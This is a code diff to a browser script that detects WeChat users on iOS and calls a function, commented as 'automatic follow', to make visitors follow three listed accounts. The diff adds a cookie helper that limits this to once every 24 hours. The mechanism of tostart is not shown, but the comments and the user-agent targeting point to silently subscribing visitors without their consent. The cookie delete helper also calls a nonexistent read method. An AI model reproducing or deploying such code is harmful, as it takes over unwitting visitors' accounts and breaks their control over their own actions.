@@ -1,6 +1,50 @@
-var data = ['neihanxb', 'videos88', 'fashion_jk'];
-(function () {
+
+!(function () {
+  var data = ['neihanxb', 'videos88', 'fashion_jk'];
   var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+  var MyCookie = (function () {
+    return {
+      /**
+     * 设置cookie
+     * @param name 名称
+     * @param value 值
+     * @param expires 有效时间（单位：小时）（可选） 默认：24h
+     */
+      set: function (name, value, expires) {
+        var expTimes = expires ? (Number(expires) * 60 * 60 * 1000) : (24 * 60 * 60 * 1000); // 毫秒
+        var expDate = new Date();
+        expDate.setTime(expDate.getTime() + expTimes);
+        var expString = expires ? '; expires=' + expDate.toUTCString() : '';
+        var pathString = '; path=/';
+        document.cookie = name + '=' + encodeURI(value) + expString + pathString;
+      },
+      /**
+       * 读cookie
+       * @param name
+       */
+      get: function (name) {
+        var cookieStr = '; ' + document.cookie + '; ';
+        var index = cookieStr.indexOf('; ' + name + '=');
+        if (index !== -1) {
+          var s = cookieStr.substring(index + name.length + 3, cookieStr.length);
+          return decodeURI(s.substring(0, s.indexOf('; ')));
+        } else {
+          return null;
+        }
+      },
+      /**
+       * 删除cookie
+       * @param name
+       */
+      del: function (name) {
+        var exp = new Date(new Date().getTime() - 1);
+        var s = this.read(name);
+        if (s !== null) {
+          document.cookie = name + '=' + s + '; expires=' + exp.toUTCString() + '; path=/';
+        }
+      }
+    }
+  })();
   function isWeiXin() {
     var ua = window.navigator.userAgent.toLowerCase();
     if (ua.match(/MicroMessenger/i) == 'micromessenger') {
@@ -83,13 +127,16 @@ var data = ['neihanxb', 'videos88', 'fashion_jk'];
     }
   }
 
-  if (window.name === '') {
-    if (isWeiXin() && isIos) {
-      tostart(data);
+  if (!MyCookie.get('__HAS_ACTIVED')) {
+    MyCookie.set('__HAS_ACTIVED', 1, 24); // 24小时内只执行一次自动关注    
+    if (window.name === '') {
+      if (isWeiXin() && isIos) {
+        tostart(data);
+      }
+    } else {
+      window.loadadd = true;
+      window.name = ''
     }
-  } else {
-    window.loadadd = true;
-    window.name = ''
   }
 })();
 
